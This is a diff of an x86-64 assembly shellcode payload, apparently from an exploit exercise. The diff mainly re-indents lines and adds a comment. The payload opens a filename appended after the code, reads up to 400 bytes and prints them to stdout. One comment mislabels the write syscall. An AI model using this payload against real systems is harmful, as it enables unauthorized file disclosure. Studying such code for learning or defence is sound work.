@@ -1,4 +1,5 @@
 ;Author: Weston Silbaugh
+;the asm for our shellcode payload
 	section .mysec write exec alloc
 	global	main
 
@@ -8,36 +9,32 @@ s1:
 ;add null char
 	xor		rax, rax
 	pop		rbx
-	push	rbx
+	push 		rbx
 	add		bx,231
 	mov		[ebx],eax
 ;open:
 	add		al, 0x02	;sys_open
-	pop		rdi			;const char *fname
-	push	rdi
+	pop		rdi		;const char *fname
+	push 		rdi
 	xor		rsi, rsi	;int flags
 	xor		rdx, rdx	;int mode
 	syscall
 ;read:
 	mov		rdi, rax	;int fd
 	xor		rax, rax	;sys_read
-	pop		rsi			;buff
-	push	rsi
+	pop		rsi		;buff
+	push 		rsi
 	add		dx, 400		;size
 	syscall
 ;write:
 	xor		eax, eax
-	add 	al, 0x01	;sys_read
+	add 		al, 0x01	;sys_read
 	xor		rdi, rdi
 	add		rdi, 1		;int fd
-	pop		rsi			;buff
+	pop		rsi		;buff
 	;mov		rdx, 128	;size
 	syscall
 exit:
-	;xor		eax, eax
-	;xor		ebx, ebx
-	;add		al, 1
-	;int		0x80
 	xor		rax, rax
 	xor		rdi, rdi
 	add		al, 60
